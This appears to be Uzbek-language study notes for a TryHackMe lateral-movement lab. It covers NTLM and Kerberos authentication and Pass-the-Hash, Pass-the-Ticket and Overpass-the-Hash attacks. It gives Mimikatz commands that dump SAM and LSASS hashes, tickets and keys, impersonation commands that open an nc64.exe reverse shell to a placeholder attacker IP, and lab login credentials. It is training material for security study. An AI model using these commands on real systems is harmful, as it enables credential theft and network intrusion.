## 🧾 Alternativ autentifikatsiya vositalari nima?

**"Alternate authentication material"** degani — foydalanuvchining haqiqiy parolini bilmasdan tizimga kirish imkonini beruvchi **hashlar, Kerberos chipta(lari), kalitlar**.

Bu usullar quyidagi protokollar orqali ishlatiladi:

* ✅ **NTLM (NT LAN Manager)**
* ✅ **Kerberos**

### ⚠️ Shart: Mimikatz vositasi orqali hashlar yoki tiketlar olishni bilish kerak.

---

## 🔐 NTLM Autentifikatsiyasi qanday ishlaydi?

NTLM 6 bosqichli autentifikatsiya jarayoniga ega:

1. Klient serverga ulanish so‘rovini yuboradi.
2. Server **challenge** (tasodifiy son) yuboradi.
3. Klient **NTLM hash** va challenge asosida **javob** (response) hosil qiladi.
4. Server bu javobni **Domain Controller** ga yuboradi.
5. Domain Controller uni tekshiradi va tasdiqlasa — kirish ruxsati beradi.
6. Server natijani klientga yuboradi.

---

## 🔓 Pass-the-Hash (PtH) hujumi

Agar siz foydalanuvchining **NTLM hash** ni olgan bo‘lsangiz (paroli emas, faqat hash), siz:

👉 **Parolni bilmasdan** tizimga ulanishingiz mumkin.

### ✅ Mimikatz orqali hash olish usullari:

#### 🟢 1. Mahalliy foydalanuvchi hashlarini olish (SAM dan):

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

#### 🟡 2. LSASS xotirasidan domen foydalanuvchi hashlarini olish:

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::msv
```

#### 🔁 PtH ishlatish:

```powershell
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:<NTLM_HASH> /run:"c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> 5555"
```

🧠 `whoami` desangiz avvalgi foydalanuvchi chiqadi, ammo **amalga oshirilayotgan buyruqlar** – injektsiya qilingan foydalanuvchi huquqlari bilan bajariladi.

---

## 🐧 Linuxda PtH ishlatish:

1. **RDP orqali:**

```bash
xfreerdp /v:<victim_ip> /u:DOMAIN\\User /pth:<NTLM_HASH>
```

2. **psexec orqali:**

```bash
psexec.py -hashes <NTLM_HASH> DOMAIN/User@victim_ip
```

3. **WinRM orqali:**

```bash
evil-winrm -i <victim_ip> -u User -H <NTLM_HASH>
```

---

## 🎫 Kerberos Autentifikatsiyasi

1. Foydalanuvchi **username + timestamp** yuboradi (paroldan olinadigan kalit bilan shifrlangan).
2. KDC (Domain Controller) foydalanuvchiga **TGT (Ticket Granting Ticket)** va **Session Key** beradi.
3. TGT orqali foydalanuvchi kerakli xizmatga **TGS (Ticket Granting Service)** talab qiladi.
4. Keyin TGS yordamida xizmatga ulanish mumkin bo‘ladi.

---

## 🎟️ Pass-the-Ticket (PtT) hujumi

TGT yoki TGS ni **mimikatz** orqali LSASS dan chiqarib olish mumkin:

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

#### Chipta injektsiya qilish:

```powershell
mimikatz # kerberos::ptt <file>.kirbi
```

#### Tekshirish:

```powershell
klist
```

---

## 🗝️ Overpass-the-Hash / Pass-the-Key (PtK)

Parolning o‘rniga **Kerberos encryption key** (RC4, AES128, AES256) orqali TGT olinadi.

### Kalitlarni olish:

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

### Keyin:

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:<HASH> /run:"c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> 5556"
```

👉 RC4 = NTLM hash, shuning uchun NTLM hash orqali ham PtK bajarish mumkin — bu **Overpass-the-Hash** deb ataladi.

---

## 🧪 Amaliy topshiriq

### SSH orqali tizimga ulan:

```bash
ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
parol: iLov3THM!
```

### Maqsad:

1. **mimikatz** orqali `t1_toby.beck` ning NTLM hash yoki TGT yoki encryption key ni olish.

2. So‘ngra:

   * `Pass-the-Hash`
   * `Pass-the-Ticket`
   * `Pass-the-Key`

3. Muvaffaqiyatli injektsiyadan keyin:

```powershell
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

4. `t1_toby.beck` ning kompyuteridagi **Desktop** ichidan flagni top.

